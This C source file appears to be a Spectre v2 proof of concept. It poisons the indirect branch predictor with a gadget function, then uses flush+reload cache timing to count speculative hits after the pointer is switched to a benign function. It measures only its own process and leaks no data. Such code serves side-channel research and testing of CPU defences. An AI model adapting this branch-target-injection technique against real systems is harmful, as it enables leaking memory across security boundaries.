#include <stdio.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <stdint.h>
#include <string.h>

#include "../util.h"

// Threshhold, adjust to match machine
#define THR 100

#define POISON_ITERATIONS 5

// Function pointer for spectre v2
typedef void (*func_ptr_t)(size_t fr_buf);
func_ptr_t func_ptr = 0x00;

// Spectre_v2 Gadget
void gadget(size_t fr_buf) {
    // Touch reloadbuffer
    asm volatile("mov (%rdi), %rdi");
}

// Benign function
void benign(size_t arg1) {
    return;
}

void __attribute__((noinline)) do_ind_call(size_t arg1) {

    _mm_mfence();

    // Reset PHT
    asm volatile (
    ".rept 200\n"
        "jmp 1f\n"
        "1:\n"
    ".endr\n"
    );

    func_ptr((size_t) arg1);

    _mm_mfence();
}


void speculate() {
    size_t hits = 0;
    uint64_t t;

    // Allocation of F&R buffer
    uint8_t * fr_buf = (uint8_t *) malloc(0x1000 * 4) + 0x2000;
    memset(fr_buf, 0x94, 0x1000);

    // Set function pointer to gadget for training
    func_ptr = (func_ptr_t) &gadget;

    // Training
    for (size_t i = 0; i < POISON_ITERATIONS; i++) {
        _mm_clflush(fr_buf);
        _mm_clflush(&func_ptr);
        _mm_mfence();

        do_ind_call((size_t) fr_buf);
        t = load_time(fr_buf);
        if(t < THR) {
            hits++;
        }
    }

    printf("Hits (Training): %4ld\n", hits);
    hits = 0;

    _mm_mfence();

    // Spectre
    for (size_t i = 0; i < POISON_ITERATIONS; i++) {
        func_ptr = (func_ptr_t) &gadget;
        do_ind_call((size_t) fr_buf);

        // Set function pointer to benign for the attack
        func_ptr = &benign;
        _mm_clflush(fr_buf);
        _mm_clflush(&func_ptr);
        _mm_mfence();

        do_ind_call((size_t) fr_buf);
        t = load_time(fr_buf);
        if(t < THR) {
            hits++;
        }
    }

    printf("Hits (Spectre):  %4ld\n", hits);
}

int main() {
    speculate();

    return EXIT_SUCCESS;
}
